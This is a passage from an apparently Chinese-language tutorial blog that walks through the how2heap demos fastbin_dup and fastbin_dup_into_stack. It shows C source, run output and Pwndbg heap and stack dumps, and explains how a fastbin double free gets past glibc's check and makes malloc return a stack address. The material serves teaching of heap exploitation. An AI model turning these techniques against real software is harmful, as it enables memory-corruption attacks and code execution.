class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>在这之前，我们先看一个程序。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">17</span>     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line"><span class="number">18</span>     <span class="built_in">free</span>(a);</span><br><span class="line"><span class="number">19</span></span><br><span class="line"><span class="number">20</span>     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line"><span class="number">21</span>     <span class="built_in">free</span>(a);</span><br><span class="line"><span class="number">22</span></span><br><span class="line"><span class="number">23</span>     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line"><span class="number">24</span>     <span class="built_in">free</span>(b);</span><br><span class="line"><span class="number">25</span></span><br></pre></td></tr></table></figure>

<p>我们把21 行的注释去掉。编译程序并运行。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">This file demonstrates a simple double-free attack with fastbins.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st malloc(8): 0xb74010</span><br><span class="line">2nd malloc(8): 0xb74030</span><br><span class="line">3rd malloc(8): 0xb74050</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0xb74010 again, things will crash because 0xb74010 is at the top of the free list.</span><br><span class="line">*** Error <span class="keyword">in</span> `./fastbin_dup_double_free<span class="string">&#x27;: double free or corruption (fasttop): 0x0000000000b74010 ***</span></span><br><span class="line"><span class="string">======= Backtrace: =========</span></span><br><span class="line"><span class="string">/lib/x86_64-linux-gnu/libc.so.6(+0x790cb)[0x7fe7c6e7d0cb]</span></span><br><span class="line"><span class="string">/lib/x86_64-linux-gnu/libc.so.6(+0x82c9a)[0x7fe7c6e86c9a]</span></span><br><span class="line"><span class="string">/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7fe7c6e8ad8c]</span></span><br><span class="line"><span class="string">./fastbin_dup_double_free[0x400740]</span></span><br><span class="line"><span class="string">/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf1)[0x7fe7c6e243f1]</span></span><br><span class="line"><span class="string">./fastbin_dup_double_free[0x40054a]</span></span><br><span class="line"><span class="string">======= Memory map: ========</span></span><br></pre></td></tr></table></figure>

<p>当我们运行程序后，程序发生了明显的报错，这是一个典型的 **double free **。意味通常而言，一个已经 free 掉的 chunk 是不能被 free 第二次的。然后我们把原本的注释加上。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">17</span>     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line"><span class="number">18</span>     <span class="built_in">free</span>(a);</span><br><span class="line"><span class="number">19</span></span><br><span class="line"><span class="number">20</span>     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line"><span class="number">21</span>     <span class="comment">//free(a);</span></span><br><span class="line"><span class="number">22</span></span><br><span class="line"><span class="number">23</span>     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line"><span class="number">24</span>     <span class="built_in">free</span>(b);</span><br></pre></td></tr></table></figure>

<p>然后重新编译。<code>gcc -g -no-pie fastbin_dup.c -o fastbin_dup</code>  并上调试器。</p>
<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814165413.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814165413.png"></a></p>
<p>首先程序 malloc 了三个 chunk 。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; heap</span><br><span class="line">Top Chunk: 0x602060</span><br><span class="line">Last Remainder: 0</span><br><span class="line"></span><br><span class="line">0x602000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x21,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x21</span><br><span class="line">&#125;</span><br><span class="line">0x602020 FASTBIN &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x21,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x21</span><br><span class="line">&#125;</span><br><span class="line">0x602040 FASTBIN &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x21,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x20fa1</span><br><span class="line">&#125;</span><br><span class="line">0x602060 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x20fa1,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后 free(a)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">15</span> 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, c);</span><br><span class="line">  <span class="number">16</span></span><br><span class="line">  <span class="number">17</span> 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line">► <span class="number">18</span> 	<span class="built_in">free</span>(a);</span><br><span class="line">  <span class="number">19</span></span><br><span class="line">  <span class="number">20</span> 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line">  <span class="number">21</span> 	<span class="comment">//free(a);</span></span><br></pre></td></tr></table></figure>

<p>free(b)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">22</span></span><br><span class="line">  <span class="number">23</span> 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">  <span class="number">24</span> 	<span class="built_in">free</span>(b);</span><br><span class="line">  <span class="number">25</span></span><br><span class="line">► <span class="number">26</span> 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line">  <span class="number">27</span> 	<span class="built_in">free</span>(a);</span><br></pre></td></tr></table></figure>

<p>这个时候，fastbin 形成一个 fastbin freelist</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x602020 —▸ 0x602000 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure>

<p>chunk A  —&gt; chunk B</p>
<p>然后我们再把 a free 一次</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">22</span></span><br><span class="line">  <span class="number">23</span> 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">  <span class="number">24</span> 	<span class="built_in">free</span>(b);</span><br><span class="line">  <span class="number">25</span></span><br><span class="line">  <span class="number">26</span> 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line">► <span class="number">27</span> 	<span class="built_in">free</span>(a);</span><br><span class="line">  <span class="number">28</span></span><br><span class="line">  <span class="number">29</span> 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);</span><br><span class="line">  <span class="number">30</span> 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">  <span class="number">31</span> 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">  <span class="number">32</span> 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br></pre></td></tr></table></figure>

<p>我们发现这次并没有发生报错。形成了如下的 free list。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x602000 —▸ 0x602020 ◂— 0x602000</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure>

<p>—————     —————      ————— </p>
<p>|Chunk A| -&gt; |chunk B| –&gt;| chunk A|</p>
<p>—————     —————      ————— </p>
<pre><code>                              /\                          |

                              |  ------------- -------</code></pre>
<p>大概如上个图，这样我们就成功绕过了 fastbins 的double free检查。原因如下：</p>
<p>fastbins 可以看成一个 LIFO 的栈，使用单链表实现，通过 fastbin-&gt;fd 来遍历 fastbins。由于 free 的过程会对 free list 做检查，我们不能连续两次 free 同一个 chunk，所以这里在两次 free 之间，增加了一次对其他 chunk 的 free 过程，从而绕过检查顺利执行。然后再 malloc 三次，就在同一个地址 malloc 了两次，也就有了两个指向同一块内存区域的指针。</p>
<h3 id="0x3-fastbin-dup-into-stack"><a href="#0x3-fastbin-dup-into-stack" class="headerlink" title="0x3 fastbin_dup_into_stack"></a>0x3 fastbin_dup_into_stack</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file extends on fastbin_dup.c by tricking malloc into\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;returning a pointer to a controlled location (in this case, the stack).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> stack_var;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, <span class="number">8</span>+(<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p, %p, %p ]. &quot;</span></span><br><span class="line">		<span class="string">&quot;We&#x27;ll now carry out our attack by modifying data at %p.\n&quot;</span>, a, b, a, a);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, d);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p ].\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;</span></span><br><span class="line">		<span class="string">&quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;</span></span><br><span class="line">		<span class="string">&quot;so that malloc will think there is a free chunk there and agree to\n&quot;</span></span><br><span class="line">		<span class="string">&quot;return a pointer to it.\n&quot;</span>, a);</span><br><span class="line">	stack_var = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;</span>, a);</span><br><span class="line">	*d = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) (((<span class="keyword">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(8): %p, putting the stack address on the free list\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;4th malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>通用的，编译后我们 gdb 挂载程序。</p>
<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814172825.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814172825.png"></a></p>
<p>程序通用 malloc 了三个 chunk,紧接着通过 fastbin double free 的操作形成了如下freelist。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x603000 —▸ 0x603020 ◂— 0x603000</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure>



<p>然后呢 我再malloc chunk d</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">36</span> 	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">  <span class="number">37</span></span><br><span class="line">  <span class="number">38</span> 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, d);</span><br><span class="line">  <span class="number">39</span> 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">  <span class="number">40</span> 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p ].\n&quot;</span>, a);</span><br><span class="line">► <span class="number">41</span> 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;</span></span><br><span class="line">  <span class="number">42</span> 		<span class="string">&quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;</span></span><br><span class="line">  <span class="number">43</span> 		<span class="string">&quot;so that malloc will think there is a free chunk there and agree to\n&quot;</span></span><br><span class="line">  <span class="number">44</span> 		<span class="string">&quot;return a pointer to it.\n&quot;</span>, a);</span><br><span class="line">  <span class="number">45</span> 	stack_var = <span class="number">0x20</span>;</span><br></pre></td></tr></table></figure>

<p>这个时候 程序会从 fastbins 里取一个，由于fastbins 是 LIFO （Last in First out）。 chunk A 会被取出使用。倘若我们这个时候能对 chunk D 进行操作，如 <code>d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));</code> 由于 <code>stack_var = 0x20;</code>这样的定义是在函数内，所以<code>stack_var</code>的地址将在栈上，通过对指针 <strong>d</strong> 的操作，我们可以伪造一个 chunk ，并将这个 chunk 放在栈上。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; x&#x2F;20a 0x603000</span><br><span class="line">0x603000:	0x0	0x21</span><br><span class="line">0x603010:	0x7fffffffe388	0x0</span><br><span class="line">0x603020:	0x0	0x21</span><br><span class="line">0x603030:	0x603000	0x0</span><br><span class="line">0x603040:	0x0	0x21</span><br><span class="line">0x603050:	0x0	0x0</span><br><span class="line">0x603060:	0x0	0x20fa1</span><br><span class="line">0x603070:	0x0	0x0</span><br><span class="line">0x603080:	0x0	0x0</span><br><span class="line">0x603090:	0x0	0x0</span><br><span class="line">Pwndbg&gt; x&#x2F;20a 0x7fffffffe388</span><br><span class="line">0x7fffffffe388:	0x40097c &lt;main+758&gt;	0x20</span><br><span class="line">0x7fffffffe398:	0x603010	0x603030</span><br><span class="line">0x7fffffffe3a8:	0x603050	0x603010</span><br><span class="line">0x7fffffffe3b8:	0xc3e158ae04ceee00	0x4009a0 &lt;__libc_csu_init&gt;</span><br><span class="line">0x7fffffffe3c8:	0x7ffff7a303f1 &lt;__libc_start_main+241&gt;	0x40000</span><br><span class="line">0x7fffffffe3d8:	0x7fffffffe4a8	0x1f7b9a488</span><br><span class="line">0x7fffffffe3e8:	0x400686 &lt;main&gt;	0x0</span><br><span class="line">0x7fffffffe3f8:	0x4ffa6e8ae3316c56	0x400590 &lt;_start&gt;</span><br><span class="line">0x7fffffffe408:	0x7fffffffe4a0	0x0</span><br><span class="line">0x7fffffffe418:	0x0	0xb00591f537d16c56</span><br><span class="line">Pwndbg&gt; stack 10</span><br><span class="line">00:0000│ rsp  0x7fffffffe390 ◂— 0x20 &#x2F;* &#39; &#39; *&#x2F;</span><br><span class="line">01:0008│      0x7fffffffe398 —▸ 0x603010 —▸ 0x7fffffffe388 —▸ 0x40097c (main+758) ◂— 0x4d8b4800000000b8</span><br><span class="line">02:0010│      0x7fffffffe3a0 —▸ 0x603030 —▸ 0x603000 ◂— 0x0</span><br><span class="line">03:0018│      0x7fffffffe3a8 —▸ 0x603050 ◂— 0x0</span><br><span class="line">04:0020│      0x7fffffffe3b0 —▸ 0x603010 —▸ 0x7fffffffe388 —▸ 0x40097c (main+758) ◂— 0x4d8b4800000000b8</span><br><span class="line">05:0028│      0x7fffffffe3b8 ◂— 0xc3e158ae04ceee00</span><br><span class="line">06:0030│ rbp  0x7fffffffe3c0 —▸ 0x4009a0 (__libc_csu_init) ◂— 0x41ff894156415741</span><br><span class="line">07:0038│      0x7fffffffe3c8 —▸ 0x7ffff7a303f1 (__libc_start_main+241) ◂— mov    edi, eax</span><br><span class="line">08:0040│      0x7fffffffe3d0 ◂— 0x40000</span><br><span class="line">09:0048│      0x7fffffffe3d8 —▸ 0x7fffffffe4a8 —▸ 0x7fffffffe6ea ◂— 0x77732f656d6f682f (&#39;&#x2F;home&#x2F;sw&#39;)</span><br></pre></td></tr></table></figure>

<p><code>stack_var = 0x20;</code> 是由于伪造的 chunk 要由 设置size，size的位置位于 地址-0x8的地方。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">➜  glibc_2.25 git:(master) ✗ .&#x2F;fastbin_dup_into_stack</span><br><span class="line">This file extends on fastbin_dup.c by tricking malloc into</span><br><span class="line">returning a pointer to a controlled location (in this case, the stack).</span><br><span class="line">The address we want malloc() to return is 0x7fff02a085c8.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st malloc(8): 0x146b010</span><br><span class="line">2nd malloc(8): 0x146b030</span><br><span class="line">3rd malloc(8): 0x146b050</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0x146b010 again, things will crash because 0x146b010 is at the top of the free list.</span><br><span class="line">So, instead, we&#39;ll free 0x146b030.</span><br><span class="line">Now, we can free 0x146b010 again, since it&#39;s not the head of the free list.</span><br><span class="line">Now the free list has [ 0x146b010, 0x146b030, 0x146b010 ]. We&#39;ll now carry out our attack by modifying data at 0x146b010.</span><br><span class="line">1st malloc(8): 0x146b010</span><br><span class="line">2nd malloc(8): 0x146b030</span><br><span class="line">Now the free list has [ 